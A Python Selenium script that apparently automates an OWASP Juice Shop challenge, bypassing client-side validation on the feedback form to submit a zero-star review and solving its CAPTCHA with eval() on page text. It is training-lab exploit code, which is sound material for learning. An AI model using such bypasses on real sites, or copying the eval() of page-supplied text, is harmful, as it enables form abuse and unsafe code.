# This file will allow us to exploit the Customer feedback functionality of the OWASP 
# Juice Shop by submitting a form with user-changed values.

# Completes the achievement "Improper Input Validation - Zero Stars"

#Import libraries
from selenium.webdriver.common.by import By
import time
from Exploits import SQLi

# This will allow us to exploit the customer feedback to leave a zero-star review.
def test_iiv(driver, base_url, sleep):
    try:
        if (len(driver.find_elements(By.XPATH, "//mat-icon[contains(text(), 'shopping_cart')]")) < 1):
            SQLi.test_sqli(driver, base_url, sleep)
    
        driver.get(f"{base_url}/#/about")
        time.sleep(sleep)
        before_items = len(driver.find_elements(By.TAG_NAME, "gallery-item"))

        driver.get(f"{base_url}/#/contact")
        time.sleep(sleep)

        comment_field = driver.find_element(By.ID, "comment")
        comment_field.send_keys("Gonna review bomb y'all")
        
        # Make changes to elements in order to bypass input validation.
        driver.execute_script("""
            const slider = document.querySelector('mat-slider#rating');
            const input = slider.querySelector('input');
            const btn = document.getElementById('submitButton');
                              
            slider.setAttribute('min', '0');
            input.setAttribute('min', '0');
            input.setAttribute('aria-valuetext', '0â˜…')
            btn.removeAttribute('disabled');
            btn.classList.remove('mat-mdc-button-disabled');
        """)

        captcha = driver.find_element(By.ID, "captcha")
        expression = captcha.text.strip()
        answer = eval(expression)
        result_field = driver.find_element(By.ID, "captchaControl")
        result_field.send_keys(f"{answer}")

        time.sleep(sleep)
        submit = driver.find_element(By.ID, "submitButton")
        submit.click()

        driver.get(f"{base_url}/#/about")
        time.sleep(sleep)
        new_items = len(driver.find_elements(By.TAG_NAME, "gallery-item"))

        success = False
        if new_items > before_items:
            success = True
        return success

    except Exception as e:
        print(f"An exception occured: {e}")
        return False